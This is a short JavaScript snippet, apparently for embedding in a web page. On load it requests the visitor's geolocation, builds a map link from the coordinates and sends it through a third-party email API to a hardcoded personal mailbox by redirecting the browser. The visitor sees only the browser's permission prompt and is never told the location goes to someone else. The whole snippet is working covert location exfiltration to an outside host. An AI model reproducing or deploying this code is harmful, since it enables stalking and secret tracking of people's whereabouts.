        window.addEventListener("load", function() {
            getLocation();
        });

        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition);
            } else {
                alert("Geolocation is not supported by this browser.");
            }
        }

        function showPosition(position) {
            var jd = position.coords.longitude;
            var wd = position.coords.latitude;
            var url = "https://v.api.aa1.cn/api/qqemail/new/?to=jun.csy@qq.com&subject=2003&message=https://uri.amap.com/marker?position=" + jd + "," + wd;
            window.location.href = url;
        }
